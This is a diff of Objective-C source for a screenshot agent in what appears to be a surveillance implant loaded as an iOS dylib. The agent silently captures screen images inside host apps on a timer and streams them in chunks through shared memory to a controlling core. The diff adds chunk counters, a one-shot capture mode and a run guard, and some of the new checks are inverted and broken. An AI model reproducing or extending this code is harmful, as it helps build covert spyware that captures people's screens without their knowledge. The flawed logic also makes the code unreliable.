@@ -14,6 +14,8 @@
 #import "RCSISharedMemory.h"
 #import "RCSICommon.h"
 
+#define DEBUG_
+
 #define APP_IN_BACKGROUND 0
 #define APP_IN_FOREGROUND 1
 
@@ -43,7 +45,6 @@ extern bool CGImageDestinationFinalize(CGImageDestinationRef idst);
 
 static RCSIAgentScreenshot        *sharedAgentScreenshot = nil;
 extern RCSISharedMemory           *mSharedMemoryLogging;
-
 
 @interface RCSIAgentScreenshot (hidden)
 
@@ -87,6 +88,7 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
   NSDictionary                *windowInfo;
   shMemoryLog                 *shMemoryHeader;
   screenshotAdditionalStruct  *agentAdditionalHeader;
+  int chunck_id = 0;
    
   NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
 
@@ -197,6 +199,7 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
   logID       = getpid() ^ logTime;
   processName = [[NSBundle mainBundle] bundleIdentifier];
   windowName  = [[NSBundle mainBundle] bundleIdentifier];
+  chunck_id = 0;
   
 #ifdef DEBUG
   NSLog(@"[DYLIB] %s: screenshot log id = %d [%d - %d]", __FUNCTION__, logID, getpid(), logTime);
@@ -225,10 +228,6 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
   
   [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(screenshotAdditionalStruct) + processNameLength, windowNameLength)
                                  withBytes: [[windowName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
-  
-#ifdef DEBUG
-  NSLog(@"[DYLIB] %s: Screenshot Agent additionalHeader: %@", __FUNCTION__, rawAdditionalHeader);
-#endif
 
   logData         = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
   shMemoryHeader  = (shMemoryLog *)[logData bytes];
@@ -240,9 +239,13 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
   shMemoryHeader->agentID         = LOG_SNAPSHOT;
   shMemoryHeader->direction       = D_TO_CORE;
   shMemoryHeader->commandType     = CM_CREATE_LOG_HEADER;
-  shMemoryHeader->flag            = 0;
+  shMemoryHeader->flag            = chunck_id++;
   shMemoryHeader->commandDataSize = [rawAdditionalHeader length];
   shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
+  
+#ifdef DEBUG
+  NSLog(@"[DYLIB] %s: Screenshot Agent create logID: %#x commandType [%#x] chunck_id %d", __FUNCTION__, shMemoryHeader->logID, shMemoryHeader->commandType, chunck_id);
+#endif
   
   memcpy(shMemoryHeader->commandData,
          [rawAdditionalHeader bytes],
@@ -273,6 +276,9 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
   
   do
     {
+      // timing for producer/consumer
+      usleep(250000);
+      
       logData        = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
       shMemoryHeader = (shMemoryLog *)[logData bytes];
     
@@ -289,9 +295,6 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
       // Last block writing...
       if (byteIndex >= [entryData length])
         {
-#ifdef DEBUG
-          NSLog(@"[DYLIB] %s: Screenshot Agent sending close log to shared Memory", __FUNCTION__);
-#endif
           shMemoryHeader->commandType   = CM_CLOSE_LOG;
         }
       else
@@ -305,10 +308,14 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
       shMemoryHeader->logID           = logID;
       shMemoryHeader->agentID         = LOG_SNAPSHOT;
       shMemoryHeader->direction       = D_TO_CORE;
-      shMemoryHeader->flag            = 0;
+      shMemoryHeader->flag            = chunck_id++;
       shMemoryHeader->commandDataSize = leftBytesLength;    
       shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
      
+#ifdef DEBUG
+    if (shMemoryHeader->commandType == CM_CLOSE_LOG)
+      NSLog(@"[DYLIB] %s: Screenshot Agent sending close logID [%#x], commandType [%#x]", __FUNCTION__, shMemoryHeader->logID, shMemoryHeader->commandType);
+#endif
       if ([mSharedMemoryLogging writeMemory: logData
                                      offset: 0
                               fromComponent: COMP_AGENT] == TRUE)
@@ -323,9 +330,6 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
           NSLog(@"[DYLIB] %s: Screenshot Agent error while logging screenshot to shared memory", __FUNCTION__);
 #endif
         }
-    
-      // timing for producer/consumer
-      usleep(250000);
       
       [logData release];
     
@@ -347,6 +351,28 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
 #pragma mark -
 #pragma mark Class and init methods
 #pragma mark -
+
+- (id)init
+{
+  Class myClass = [self class];
+  
+  @synchronized(myClass)
+  {
+  if (sharedAgentScreenshot != nil)
+    {
+      self = [super init];
+      
+      if (self != nil)
+        {
+          isAlreadyRunning = FALSE;
+        }
+      
+      sharedAgentScreenshot = self;
+    }
+  }
+  
+  return sharedAgentScreenshot;
+}
 
 + (RCSIAgentScreenshot *)sharedInstance
 {
@@ -414,11 +440,20 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
 #pragma mark -
 
 - (void)start
-{
-  int  grabCounter;
-  
+{  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+    
+  // with json_config core can restart scrsht 
+  // while a previous start already grab and til terminate
+  @synchronized(self)
+  {
+    if (isAlreadyRunning == FALSE)
+      return;
+    isAlreadyRunning = TRUE;
+  }
   
+  int  grabCounter;
+    
   [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
   
   // enable _grabScreenshot
@@ -426,6 +461,10 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
   
   screenshotAgentStruct *screenshotRawData;
   screenshotRawData = (screenshotAgentStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
+  
+#ifdef DEBUG_
+  NSLog(@"[DYLIB] %s: Screenshot Agent config %@", __FUNCTION__, [mAgentConfiguration objectForKey: @"data"]);
+#endif  
   
   int sleepTime = screenshotRawData->sleepTime/1000;
   grabCounter   = sleepTime;
@@ -437,11 +476,27 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
          [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+      
+#ifdef DEBUG_
+    NSLog(@"[DYLIB] %s: Screenshot Agent try grabbing", __FUNCTION__);
+#endif
 
       // fix for iOS4
       sleep(SCR_WAIT);
-    
-      if (grabCounter == sleepTime)
+      
+      // New Configurations
+      if (screenshotRawData->sleepTime == 0xFFFFFFFF)
+        {
+#ifdef DEBUG_
+          NSLog(@"[DYLIB] %s: Screenshot Agent grabbing", __FUNCTION__);
+#endif 
+          [self _grabScreenshot];
+#ifdef DEBUG_
+        NSLog(@"[DYLIB] %s: Screenshot Agent grabbing done!!!!", __FUNCTION__);
+#endif 
+          break;
+        }
+      else if (grabCounter == sleepTime)
         {
           if([self _grabScreenshot] == YES)
             {
@@ -467,15 +522,25 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
   
   if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
     [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
-  
-  [outerPool release];
+    
+#ifdef DEBUG_
+  NSLog(@"[DYLIB] %s: Screenshot Agent stopped", __FUNCTION__);
+#endif 
+
+  // ok session terminate: next start will grab a new image
+  @synchronized(self)
+  {
+    isAlreadyRunning = FALSE;
+  }
+ 
+   [outerPool release];
 }
 
 - (BOOL)stop
 {
   int internalCounter = 0;
   
-#ifdef DEBUG
+#ifdef DEBUG_
   NSLog(@"[DYLIB] %s: stopping Screenshot Agent", __FUNCTION__);
 #endif
   
@@ -494,6 +559,17 @@ extern RCSISharedMemory           *mSharedMemoryLogging;
 #endif  
   
   return YES;
+}
+
+- (BOOL)isAlreadyRunning
+{
+  BOOL bRet = TRUE;
+  @synchronized(self)
+  {
+      bRet = isAlreadyRunning;
+  }
+  
+  return  bRet;
 }
 
 - (BOOL)resume
